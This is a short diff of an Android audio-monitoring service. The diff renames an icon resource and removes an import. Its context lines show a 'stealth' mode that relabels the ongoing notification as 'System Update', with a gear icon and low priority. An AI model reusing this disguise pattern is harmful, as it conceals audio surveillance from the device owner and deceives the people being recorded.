@@ -22,7 +22,6 @@ import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
 import java.io.File;
-import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
@@ -143,7 +142,7 @@ public class AudioStability extends Service {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle(stealth ? "System Update" : "Audio Monitor")
                 .setContentText(stealth ? "Checking for system updates..." : "Monitoring audio...")
-                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
+                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
@@ -500,7 +499,7 @@ public class AudioStability extends Service {
             Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                     .setContentTitle(stealth ? "System Update" : "Audio Monitor")
                     .setContentText(stealth ? "Checking for system updates..." : text)
-                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.app_logo)
+                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                     .setContentIntent(pendingIntent)
                     .setOngoing(true)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
